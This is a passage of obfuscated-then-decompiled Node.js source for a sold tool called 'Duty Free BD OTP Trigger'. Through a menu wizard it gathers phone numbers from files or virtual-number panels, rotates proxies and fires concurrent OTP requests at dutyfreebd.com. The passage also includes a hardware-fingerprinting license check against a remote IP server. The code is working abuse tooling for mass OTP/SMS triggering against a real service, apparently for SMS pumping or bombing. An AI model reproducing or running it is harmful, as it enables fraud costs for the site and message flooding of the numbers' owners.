        v227 = (v226 * 0x64).toFixed(0x1);
      const v228 = Math.round(v226 * 0x14),
        v229 = chalk.hex("#00A86B")('█'.repeat(v228)) + chalk.hex("#333333")('░'.repeat(0x14 - v228)),
        v230 = '\x20\x20' + chalk.hex("#00A86B").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v229 + chalk.hex("#888888")('\x20' + v227 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00A86B").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v230);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v231 = Math.floor((Date.now() - this.startTime) / 0x3e8),
        v232 = Math.floor(v231 / 0x3c) + 'm\x20' + v231 % 0x3c + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  DUTY FREE BD OTP TRIGGER — COMPLETE       ") + C('║'));
      console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v232.padEnd(0x6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v233, v234) {
    return new Promise(v235 => {
      let v236 = 0x0;
      process.stdin.resume();
      readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn3 = () => {
        process.stdout.write("[2J[H");
        printHeader(), console.log("   [33m" + v233 + "[0m\n");
        v234.forEach((v237, v238) => {
          if (v238 === v236) console.log("   [36m➔[35m " + v237.name + "[0m");else console.log("     [90m" + v237.name + "[0m");
        });
      };
      fn3();
      const fn4 = (v239, v240) => {
        if (v240.ctrl && v240.name === 'c') process.exit(0x0);
        if (v240.name === 'up') v236 = (v236 - 0x1 + v234.length) % v234.length, fn3();else {
          if (v240.name === "down") v236 = (v236 + 0x1) % v234.length, fn3();else v240.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn4), v235(v234[v236].value));
        }
      };
      process.stdin.on("keypress", fn4);
    });
  }
  async function promptText(v241, v242) {
    return new Promise(v243 => {
      process.stdout.write("   [33m" + v241 + "[0m ");
      let v244 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn5 = v245 => {
        const v246 = v245.toString();
        if (v246.includes('\x0a') || v246.includes('\x0d')) {
          process.stdin.removeListener("data", fn5), v244 += v246.split(/[\r\n]/)[0x0];
          let v247 = v244.trim();
          if (v247.startsWith('\x22') && v247.endsWith('\x22')) v247 = v247.slice(0x1, -1);
          v243(v247 || v242);
        } else v244 += v246;
      };
      process.stdin.on("data", fn5);
    });
  }
  async function interactiveWizard(v248 = '') {
    let v249 = 0x1,
      v250 = "file",
      v251 = "numbers.txt",
      v252 = null,
      v253 = null;
    let v254 = null,
      v255 = null,
      v256 = "none",
      v257 = 0xf;
    const v258 = path.join(__dirname, ".nexa_api_key");
    while (true) {
      process.stdout.write("[2J[H"), printHeader();
      if (v249 === 0x1) {
        const v269 = {};
        v269.name = "🔥 Auto fetch from Stex (2oo9)", v269.value = "stex";
        const v270 = await selectOption("SELECT NUMBER SOURCE", [{
          'name': "📁 Load from file (numbers.txt)",
          'value': "file"
        }, {
          'name': "🌐 Auto fetch from NexaOTP Panel",
          'value': "nexa"
        }, {
          'name': "⚡ Auto fetch from Voltx (2oo9)",
          'value': "voltx"
        }, v269, {
          'name': "📱 Auto fetch from SMS Bower",
          'value': "smsbower"
        }, {
          'name': "⚡ Auto fetch from Zenex",
          'value': "zenex"
        }, {
          'name': "❌ Exit Program",
          'value': "exit"
        }]);
        if (v270 === "exit") process.exit(0x0);
        v250 = v270, v249 = 0x2;
      } else {
        if (v249 === 0x2) {
          if (v250 === "voltx" || v250 === "stex") {
            const v271 = v250 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
              v272 = v250 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
              v273 = v250 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
              v274 = v250 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
            let v275 = '',
              v276 = [],
              v277 = 0x32,
              v278 = false,
              v279 = 0x1;
            while (v279 <= 0x3 && !v278) {
              process.stdout.write("[2J[H"), printHeader();
              if (v279 === 0x1) {
                if (fs.existsSync(v272)) {
                  v275 = fs.readFileSync(v272, "utf8").trim();
                  const v280 = {};
                  v280.name = "Use saved key", v280.value = "use";
                  const v281 = {};
                  v281.name = "Enter new key", v281.value = "new";
                  const v282 = {};
                  v282.name = "Remove saved key", v282.value = "remove";
                  const v283 = {};
                  v283.name = "⬅️ Back", v283.value = "back";
                  const v284 = await selectOption(v271 + " key found (" + v275.substring(0x0, 0xa) + "...)", [v280, v281, v282, v283]);
                  if (v284 === "back") {
                    v278 = true;
                    break;
                  }
                  if (v284 === "remove") fs.existsSync(v272) && fs.unlinkSync(v272), v275 = '';else {
                    if (v284 === "new") v275 = '';
                  }
                }
                if (!v275) {
                  const v285 = await promptText("Enter " + v271 + " API Key (mauthapi):", '');
                  if (v285.toLowerCase() === "back") {
                    v278 = true;
                    break;
                  }
                  v275 = v285;
                  const v286 = {};
                  v286.name = "Yes", v286.value = "yes";
                  const v287 = {};
                  v287.name = 'No', v287.value = 'no';
                  const v288 = await selectOption("Save key?", [v286, v287]);
                  if (v288 === "yes" && v275) fs.writeFileSync(v272, v275, "utf8");
                }
                if (v275) v279 = 0x2;
              } else {
                if (v279 === 0x2) {
                  const v289 = {};
                  v289.name = "✏️  Enter manually", v289.value = "manual";
                  const v290 = {};
                  v290.name = "⬅️ Back", v290.value = "back";
                  const v291 = await selectOption("How to select ranges?", [{
                    'name': "🔍 Auto Range Finder (scan console)",
                    'value': "auto"
                  }, v289, v290]);
                  if (v291 === "back") {
                    v279 = 0x1;
                    continue;
                  }
                  if (v291 === "auto") {
                    const v292 = await autoRangeFinderFor2Oo(v275, v274, selectOption, promptText);
                    v292 && v292.length > 0x0 && (v276 = v292, v279 = 0x3);
                  } else {
                    v276 = [];
                    let v293 = true;
                    while (v293) {
                      const v294 = await promptText("Enter range #" + (v276.length + 0x1) + " (e.g. 01796XXXXX) or 'back':", '');
                      if (v294.toLowerCase() === "back") {
                        if (v276.length === 0x0) break;else {
                          v276.pop();
                          continue;
                        }
                      }
                      if (v294) v276.push(v294);
                      const v295 = {};
                      v295.name = "Yes", v295.value = "yes";
                      const v296 = {};
                      v296.name = 'No', v296.value = 'no';
                      const v297 = await selectOption("Added " + v276.length + ". Add another?", [v295, v296]);
                      if (v297 === 'no') v293 = false;
                    }
                    if (v276.length > 0x0) v279 = 0x3;
                  }
                } else {
                  if (v279 === 0x3) {
                    const v298 = await promptText("How many numbers? [default: 50]:", '50');
                    if (v298.toLowerCase() === "back") {
                      v279 = 0x2;
                      continue;
                    }
                    v277 = parseInt(v298) || 0x32;
                    const v299 = {};
                    v299.provider = v250, v299.apiKey = v275, v299.getPath = v273, v299.consolePath = v274, v299.ranges = v276, v299.totalCount = v277, v255 = v299, v252 = null, v279 = 0x4;
                  }
                }
              }
            }
            if (v278) {
              v249 = 0x1;
              continue;
            }
            v249 = 0x3;
          } else {
            if (v250 === "smsbower") {
              let v300 = '',
                v301 = 'df',
                v302 = '0',
                v303 = "0.5",
                v304 = 0x32,
                v305 = 0x1,
                v306 = false;
              while (v305 <= 0x4 && !v306) {
                process.stdout.write("[2J[H"), printHeader();
                if (v305 === 0x1) {
                  if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                    v300 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                    const v307 = {};
                    v307.name = "Use saved key", v307.value = "use";
                    const v308 = {};
                    v308.name = "Enter new key", v308.value = "new";
                    const v309 = {};
                    v309.name = "Remove saved key", v309.value = "remove";
                    const v310 = {};
                    v310.name = "⬅️ Back", v310.value = "back";
                    const v311 = await selectOption("SMS Bower key found (" + v300.substring(0x0, 0xa) + "...)", [v307, v308, v309, v310]);
                    if (v311 === "back") {
                      v306 = true;
                      break;
                    }
                    if (v311 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v300 = '';else {
                      if (v311 === "new") v300 = '';
                    }
                  }
                  if (!v300) {
                    v300 = await promptText("Enter SMS Bower API Key:", '');
                    if (v300.toLowerCase() === "back") {
                      v306 = true;
                      break;
                    }
                    const v312 = {};
                    v312.name = "Yes", v312.value = "yes";
                    const v313 = {};
                    v313.name = 'No', v313.value = 'no';
                    const v314 = await selectOption("Save key?", [v312, v313]);
                    if (v314 === "yes" && v300) fs.writeFileSync(SMSBOWER_KEY_FILE, v300, "utf8");
                  }
                  if (v300) v305 = 0x2;
                } else {
                  if (v305 === 0x2) {
                    v301 = await promptText("Service code (e.g. df, fb, wa) [default: df]:", 'df');
                    if (v301.toLowerCase() === "back") {
                      v305 = 0x1;
                      continue;
                    }
                    v301 = v301 || 'df', v305 = 0x3;
                  } else {
                    if (v305 === 0x3) {
                      v302 = await promptText("Country code (0 = any, 36 = BD) [default: 36]:", '36');
                      if (v302.toLowerCase() === "back") {
                        v305 = 0x2;
                        continue;
                      }
                      v302 = v302 || '36';
                      const v315 = await promptText("Max price per number [default: 0.5]:", "0.5");
                      v303 = v315 || "0.5", v305 = 0x4;
                    } else {
                      if (v305 === 0x4) {
                        const v316 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v316.toLowerCase() === "back") {
                          v305 = 0x3;
                          continue;
                        }
                        v304 = parseInt(v316) || 0x32;
                        const v317 = {};
                        v317.apiKey = v300, v317.service = v301, v317.country = v302, v317.maxPrice = v303, v317.totalCount = v304, v253 = v317, v252 = null, v255 = null, v254 = null, v305 = 0x5;
                      }
                    }
                  }
                }
              }
              if (v306) {
                v249 = 0x1;
                continue;
              }
              v249 = 0x3;
            } else {
              if (v250 === "zenex") {
                let v318 = '',
                  v319 = [],
                  v320 = 0x32,
                  v321 = 0x1,
                  v322 = false;
                while (v321 <= 0x3 && !v322) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v321 === 0x1) {
                    if (fs.existsSync(ZENEX_KEY_FILE)) {
                      v318 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                      const v323 = {};
                      v323.name = "Use saved key", v323.value = "use";
                      const v324 = {};
                      v324.name = "Enter new key", v324.value = "new";
                      const v325 = {};
                      v325.name = "Remove saved key", v325.value = "remove";
                      const v326 = {};
                      v326.name = "⬅️ Back", v326.value = "back";
                      const v327 = await selectOption("Zenex key found (" + v318.substring(0x0, 0xa) + "...)", [v323, v324, v325, v326]);
                      if (v327 === "back") {
                        v322 = true;
                        break;
                      }
                      if (v327 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v318 = '';else {
                        if (v327 === "new") v318 = '';
                      }
                    }
                    if (!v318) {
                      v318 = await promptText("Enter Zenex API Key (mapikey):", '');
                      if (v318.toLowerCase() === "back") {
                        v322 = true;
                        break;
                      }
                      const v328 = {};
                      v328.name = 'No', v328.value = 'no';
                      const v329 = await selectOption("Save key?", [{
                        'name': "Yes",
                        'value': "yes"
                      }, v328]);
                      if (v329 === "yes" && v318) fs.writeFileSync(ZENEX_KEY_FILE, v318, "utf8");
                    }
                    if (v318) v321 = 0x2;
                  } else {
                    if (v321 === 0x2) {
                      v319 = [];
                      let v330 = true;
                      while (v330) {
                        const v331 = await promptText("Enter range #" + (v319.length + 0x1) + " (e.g. 01796XXXXX) or 'back':", '');
                        if (v331.toLowerCase() === "back") {
                          if (v319.length === 0x0) {
                            v322 = true;
                            break;
                          } else {
                            v319.pop();
                            continue;
                          }
                        }
                        if (v331) v319.push(v331);
                        const v332 = {};
                        v332.name = 'No', v332.value = 'no';
                        const v333 = await selectOption("Added " + v319.length + ". Add another?", [{
                          'name': "Yes",
                          'value': "yes"
                        }, v332]);
                        if (v333 === 'no') v330 = false;
                      }
                      if (v319.length > 0x0) v321 = 0x3;
                    } else {
                      if (v321 === 0x3) {
                        const v334 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v334.toLowerCase() === "back") {
                          v321 = 0x2;
                          continue;
                        }
                        v320 = parseInt(v334) || 0x32;
                        const v335 = {};
                        v335.apiKey = v318, v335.ranges = v319, v335.totalCount = v320, v254 = v335, v252 = null, v255 = null, v253 = null, v321 = 0x4;
                      }
                    }
                  }
                }
                if (v322) {
                  v249 = 0x1;
                  continue;
                }
                v249 = 0x3;
              } else {
                if (v250 === "file") {
                  const v336 = {};
                  v336.name = "✏️  Custom File Path", v336.value = "custom";
                  const v337 = await selectOption("SELECT TARGET NUMBERS FILE", [v336, {
                    'name': "⬅️ Go Back",
                    'value': "back"
                  }]);
                  if (v337 === "back") {
                    v249 = 0x1;
                    continue;
                  }
                  if (v337 === "custom") {
                    const v338 = await promptText("Enter Numbers File Path:", "numbers.txt");
                    if (v338.toLowerCase() === "back") continue;
                    v251 = v338;
                  } else v251 = v337;
                  if (!fs.existsSync(v251)) fs.writeFileSync(v251, '');
                  v252 = null, v249 = 0x3;
                } else {
                  let v339 = '',
                    v340 = 0x1,
                    v341 = false,
                    v342 = [],
                    v343 = 0x32,
                    v344 = "/api/v1/numbers/get";
                  while (v340 <= 0x4 && !v341) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v340 === 0x1) {
                      if (fs.existsSync(v258)) {
                        const v345 = fs.readFileSync(v258, "utf8").trim(),
                          v346 = {};
                        v346.name = "Yes, use saved key", v346.value = "yes";
                        const v347 = {};
                        v347.name = "No, enter new key", v347.value = 'no';
                        const v348 = {};
                        v348.name = "Delete saved key", v348.value = "delete";
                        const v349 = {};
                        v349.name = "⬅️ Go Back", v349.value = "back";
                        const v350 = await selectOption("Found saved API Key (..." + v345.slice(-4) + "). Use it?", [v346, v347, v348, v349]);
                        if (v350 === "back") {
                          v341 = true;
                          break;
                        }
                        if (v350 === "yes") v339 = v345;else v350 === "delete" && (fs.existsSync(v258) && fs.unlinkSync(v258), v339 = '');
                      }
                      if (!v339) {
                        const v351 = await promptText("Enter NexaOTP API Key (type 'back' to cancel):", '');
                        if (v351.toLowerCase() === "back") {
                          v341 = true;
                          break;
                        }
                        v339 = v351;
                        const v352 = {};
                        v352.name = 'No', v352.value = 'no';
                        const v353 = await selectOption("Save this key for future use?", [{
                          'name': "Yes, save it",
                          'value': "yes"
                        }, v352]);
                        if (v353 === "yes" && v339) fs.writeFileSync(v258, v339, "utf8");
                      }
                      if (v339) v340 = 0x2;
                    } else {
                      if (v340 === 0x2) {
                        v342 = [];
                        let v354 = true;
                        while (v354) {
                          const v355 = await promptText("Enter range #" + (v342.length + 0x1) + " (e.g. 01796XXXXX) or 'back':", '');
                          if (v355.toLowerCase() === "back") {
                            if (v342.length === 0x0) {
                              v340 = 0x1;
                              break;
                            } else {
                              v342.pop();
                              continue;
                            }
                          }
                          if (v355) v342.push(v355);
                          const v356 = {};
                          v356.name = "Yes, add another range", v356.value = "yes";
                          const v357 = {};
                          v357.name = "No, proceed", v357.value = 'no';
                          const v358 = {};
                          v358.name = "⬅️ Go Back to API Key", v358.value = "back";
                          const v359 = await selectOption("Added " + v342.length + " range(s). Add another?", [v356, v357, v358]);
                          if (v359 === "back") {
                            v340 = 0x1;
                            break;
                          }
                          if (v359 === 'no') v354 = false;
                        }
                        if (v342.length > 0x0) v340 = 0x3;
                      } else {
                        if (v340 === 0x3) {
                          const v360 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v360.toLowerCase() === "back") {
                            v340 = 0x2;
                            continue;
                          }
                          v343 = parseInt(v360) || 0x32, v340 = 0x4;
                        } else {
                          if (v340 === 0x4) {
                            const v361 = {};
                            v361.name = "⬅️ Back", v361.value = "back";
                            const v362 = await selectOption("SELECT NEXA SERVER", [{
                              'name': "Server 1 (/get)",
                              'value': "/api/v1/numbers/get"
                            }, {
                              'name': "Server 2 (/p2/get)",
                              'value': "/api/v1/numbers/p2/get"
                            }, {
                              'name': "Server 3 (/p3/get)",
                              'value': "/api/v1/numbers/p3/get"
                            }, v361]);
                            if (v362 === "back") {
                              v340 = 0x3;
                              continue;
                            }
                            v344 = v362;
                            const v363 = {};
                            v363.apiKey = v339, v363.ranges = v342, v363.totalCount = v343, v363.endpoint = v344, v252 = v363, v255 = null, v253 = null, v254 = null, v340 = 0x5;
                          }
                        }
                      }
                    }
                  }
                  if (v341) {
                    v249 = 0x1;
                    continue;
                  }
                  v249 = 0x3;
                }
              }
            }
          }
        } else {
          if (v249 === 0x3) {
            const v364 = {};
            v364.name = "✏️  Custom File Path", v364.value = "custom";
            const v365 = {};
            v365.name = "🚫 None (Direct Connection)", v365.value = "none";
            const v366 = {};
            v366.name = "⬅️ Go Back to Numbers Selection", v366.value = "back";
            const v367 = await selectOption("SELECT PROXIES FILE", [v364, v365, v366]);
            if (v367 === "back") {
              v249 = 0x1;
              continue;
            }
            if (v367 === "custom") {
              const v368 = await promptText("Enter Proxies File Path:", "proxies.txt");
              if (v368.toLowerCase() === "back") continue;
              v256 = v368;
            } else v367 === "none" ? v256 = "none" : v256 = v367;
            v256 && v256 !== "none" && !fs.existsSync(v256) && fs.writeFileSync(v256, ''), v249 = 0x4;
          } else {
            if (v249 === 0x4) {
              process.stdout.write("[2J[H"), printHeader();
              const v369 = await promptText("Concurrent threads [default: 15]:", '15');
              if (v369.toLowerCase() === "back") {
                v249 = 0x3;
                continue;
              }
              v257 = parseInt(v369) || 0xf, v249 = 0x5;
            } else {
              if (v249 === 0x5) {
                process.stdout.write("[2J[H"), printHeader(), console.log(C("  ┌─────────────────────────────────────────┐")), console.log(C("  │") + W.bold("  DUTY FREE BD — READY TO LAUNCH          ") + C('│')), console.log(C("  ├─────────────────────────────────────────┤")), console.log(C("  │") + ('\x20\x20' + G("Source  ") + '\x20' + B(v250 === "file" ? v251 : v250.toUpperCase())) + C('')), console.log(C("  │") + ('\x20\x20' + G("Proxy   ") + '\x20' + B(v256 === "none" ? "Direct (No Proxy)" : v256)) + C('')), console.log(C("  │") + ('\x20\x20' + G("Threads ") + '\x20' + B(String(v257))) + C('')), console.log(C("  │") + ('\x20\x20' + G("Target  ") + '\x20' + Y("dutyfreebd.com — OTP")) + C('')), console.log(C("  └─────────────────────────────────────────┘\n"));
                const v370 = {};
                v370.name = "🚀 Start Sending", v370.value = "start";
                const v371 = {};
                v371.name = "⬅️ Go Back", v371.value = "back";
                const v372 = {};
                v372.name = "❌ Exit", v372.value = "exit";
                const v373 = await selectOption('', [v370, v371, v372]);
                if (v373 === "exit") process.exit(0x0);
                if (v373 === "back") {
                  v249 = 0x4;
                  continue;
                }
                break;
              }
            }
          }
        }
      }
    }
    let v259 = [];
    if (v256 !== "none") {
      if (fs.existsSync(v256)) v259 = fs.readFileSync(v256, "utf8").split('\x0a').map(v374 => v374.trim()).filter(Boolean);else v256.includes(':') && (v259 = [v256]);
    }
    let v260 = 0x0;
    const fn6 = () => {
      if (v259.length === 0x0) return null;
      return v259[v260++ % v259.length];
    };
    async function* fn7() {
      if (v252) {
        let v375 = 0x0;
        while (v375 < v252.totalCount) {
          const v376 = v252.ranges[Math.floor(Math.random() * v252.ranges.length)];
          try {
            const v377 = await nexaLimiter.enqueue(() => nexaFetchNumber(v252.apiKey, v376, v252.endpoint));
            yield v377, v375++;
          } catch (v378) {
            yield null;
          }
        }
      } else {
        if (v255) {
          let v379 = 0x0;
          while (v379 < v255.totalCount) {
            const v380 = v255.ranges[Math.floor(Math.random() * v255.ranges.length)];
            try {
              const v381 = await nexaLimiter.enqueue(() => twoOoFetchNumber(v255.apiKey, v380, v255.getPath));
              yield v381, v379++;
            } catch (v382) {
              yield null;
            }
          }
        } else {
          if (v253) {
            let v383 = 0x0;
            while (v383 < v253.totalCount) {
              try {
                const v384 = await smsBowerFetchNumber(v253.apiKey, v253.service, v253.country, v253.maxPrice);
                yield v384.phoneNumber, v383++;
              } catch (v385) {
                yield null;
              }
            }
          } else {
            if (v254) {
              let v386 = 0x0;
              while (v386 < v254.totalCount) {
                const v387 = v254.ranges[Math.floor(Math.random() * v254.ranges.length)];
                try {
                  const v388 = await zenexFetchNumber(v254.apiKey, v387);
                  yield v388, v386++;
                } catch (v389) {
                  yield null;
                }
              }
            } else {
              const v390 = fs.readFileSync(v251, "utf8").split('\x0a').map(v391 => v391.trim()).filter(Boolean);
              for (const v392 of v390) yield v392;
            }
          }
        }
      }
    }
    let v261 = 0x0;
    if (v252) v261 = v252.totalCount;else {
      if (v255) v261 = v255.totalCount;else {
        if (v253) v261 = v253.totalCount;else {
          if (v254) v261 = v254.totalCount;else v261 = fs.readFileSync(v251, "utf8").split('\x0a').map(v393 => v393.trim()).filter(Boolean).length;
        }
      }
    }
    if (v248) {
      const v394 = generateHWID();
      v394 !== v248 && (console.error(R("\n  ✗ CRITICAL SECURITY ALERT: Runtime memory injection detected.")), console.error(R("  ✗ HWID mismatch during execution sequence. Aborting...\n")), process.exit(0x1));
    }
    process.stdout.write("[2J[H"), printHeader(), console.log(B('\x20\x20') + C('━'.repeat(0x2c)));
    console.log(B('\x20\x20') + W.bold("  🚀 LAUNCHING DUTY FREE BD OTP ENGINE")), console.log(B('\x20\x20') + C('━'.repeat(0x2c)) + '\x0a');
    const v262 = new Dashboard(v261),
      v263 = {};
    v263.count = 0x0, v263.max = v257;
    v263.queue = [];
    const v264 = v263;
    function fn8() {
      return new Promise(v395 => {
        if (v264.count < v264.max) v264.count++, v395();else v264.queue.push(v395);
      });
    }
    function fn9() {
      v264.count--;
      v264.queue.length > 0x0 && (v264.count++, v264.queue.shift()());
    }
    const v265 = [];
    for await (const v396 of fn7()) {
      if (!v396) {
        v262.processed++, v262.failed++, v262.addLog("Failed to fetch number from provider", "error");
        continue;
      }
      await fn8();
      const v397 = (async () => {
        try {
          const v398 = fn6(),
            v399 = {};
          v399.proxy = v398, v399.timeout = 0x61a8;
          const v400 = await triggerOTP(v396, v399);
          v262.processed++, v400.success ? (v262.successful++, fs.appendFileSync("successful.txt", v400.phone + '\x0a', "utf8"), v262.addLog(v400.phone, "success")) : (v262.failed++, fs.appendFileSync("failed.txt", v400.phone + " | " + v400.message + '\x0a', "utf8"), v262.addLog("Failed on " + v400.phone + ':\x20' + v400.message, "error"));
        } catch (v401) {
          v262.processed++, v262.failed++, fs.appendFileSync("failed.txt", v396 + " | " + v401.message + '\x0a', "utf8"), v262.addLog("Fatal error on " + v396 + ':\x20' + v401.message, "error");
        } finally {
          fn9();
        }
      })();
      v265.push(v397);
    }
    await Promise.allSettled(v265), v262.stop();
    const v266 = {};
    v266.name = "🔄 Yes, restart", v266.value = "yes";
    const v267 = {};
    v267.name = "❌ Exit", v267.value = 'no';
    const v268 = await selectOption("Run again?", [v266, v267]);
    if (v268 === "yes") await interactiveWizard(v248);else process.exit(0x0);
  }
  function generateHWID() {
    const v402 = require('os');
    const v403 = v402.platform();
    try {
      if (v403 === "win32") {
        const v404 = {};
        v404.stdio = "pipe", v404.timeout = 0x3a98;
        const v405 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', v404).toString().trim();
        if (!v405) throw new Error("No hardware data");
        const v406 = crypto.createHash("sha256").update(v405).digest("hex").toUpperCase();
        return "SKING-" + v406.substring(0x0, 0x8) + '-' + v406.substring(0x8, 0xc) + '-' + v406.substring(0xc, 0x10);
      } else {
        let v407 = [];
        try {
          const v411 = {};
          v411.stdio = "pipe", v411.timeout = 0x1388;
          const v412 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", v411).toString().trim();
          if (v412 && v412 !== "null") v407.push('A:' + v412);
        } catch (v413) {}
        try {
          if (fs.existsSync("/proc/cpuinfo")) {
            const v414 = fs.readFileSync("/proc/cpuinfo", "utf8"),
              v415 = v414.match(/Serial\s*:\s*(\S+)/i),
              v416 = v414.match(/Hardware\s*:\s*(.+)/i);
            if (v415 && v415[0x1] !== "0000000000000000") v407.push('S:' + v415[0x1].trim());
            if (v416) v407.push('H:' + v416[0x1].trim());
          }
        } catch (v417) {}
        try {
          if (fs.existsSync("/etc/machine-id")) {
            const v418 = fs.readFileSync("/etc/machine-id", "utf8").trim();
            if (v418) v407.push('M:' + v418);
          }
        } catch (v419) {}
        try {
          const v420 = v402.cpus(),
            v421 = v420 && v420.length > 0x0 ? v420[0x0].model : "UnknownCPU",
            v422 = v402.totalmem(),
            v423 = v402.release(),
            v424 = v402.hostname();
          v407.push('F:' + v421 + '|' + v422 + '|' + v423 + '|' + v424);
        } catch (v425) {}
        const v408 = v407.join('||'),
          v409 = crypto.createHash("sha256").update(v408).digest("hex").toUpperCase(),
          v410 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
        return v410 + v409.substring(0x0, 0x8) + '-' + v409.substring(0x8, 0xc) + '-' + v409.substring(0xc, 0x10);
      }
    } catch (v426) {
      return '';
    }
  }
  function verifyServerSignature(v427, v428) {
    if (!v428) return false;
    try {
      return crypto.verify(null, Buffer.from(v427, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v428, "base64"));
    } catch (v429) {
      return false;
    }
  }
  async function start() {
    const v430 = generateHWID();
    !v430 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(0x1));
    const v431 = generateHWID();
    v431 !== v430 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(0x1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Duty Free BD OTP Trigger     ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v430.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v432 = false;
    const v433 = Date.now();
    try {
      const v434 = await new Promise((v435, v436) => {
        const v437 = {};
        v437.hwid = v430, v437.app_id = "dutyfree", v437.version = "1.0.0", v437.timestamp = v433;
        const v438 = JSON.stringify(v437),
          v439 = {
            'hostname': "188.137.176.163",
            'port': 0xec1,
            'path': "/api/verify",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v438)
            },
            'timeout': 0x2710
          };
        const v440 = http.request(v439, v441 => {
          let v442 = '';
          v441.on("data", v443 => v442 += v443), v441.on("end", () => {
            try {
              v435(JSON.parse(v442));
            } catch (v444) {
              v436(v444);
            }
          });
        });
        v440.on("error", v436), v440.on("timeout", function () {
          this.destroy(), v436(new Error("Timeout"));
        }), v440.write(v438);
        v440.end();
      });
      if (v434) {
        v434.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(0x1));
        if (v434.status === "banned" || v434.status === "expired" || !v434.sig) {
          await new Promise(v448 => setTimeout(v448, 0x7d0));
          let v447 = String(v434.reason || "NOT REGISTERED");
          if (!v434.reason && !v434.sig) v447 = "NOT REGISTERED / REMOVED";
          console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — DTFREE TOOL    ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v430.padEnd(0x21)) + R('║')), console.error(R("  ║  Status : " + v447.padEnd(0x1a) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
        }
        const v445 = v430 + "|dutyfree|1.0.0|" + v433;
        !verifyServerSignature(v445, v434.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(0x1));
        v432 = true;
        let v446 = v434.token;
        !v446 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(0x1)), setInterval(() => {
          !v446 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(0x1));
          const v449 = {};
          v449.hwid = v430, v449.app_id = "dutyfree", v449.token = v446;
          const v450 = JSON.stringify(v449);
          const v451 = {
              'hostname': "188.137.176.163",
              'port': 0xec1,
              'path': "/api/ping",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v450)
              },
              'timeout': 0x1388
            },
            v452 = http.request(v451, v453 => {
              let v454 = '';
              v453.on("data", v455 => v454 += v455);
              v453.on("end", () => {
                try {
                  const v456 = JSON.parse(v454);
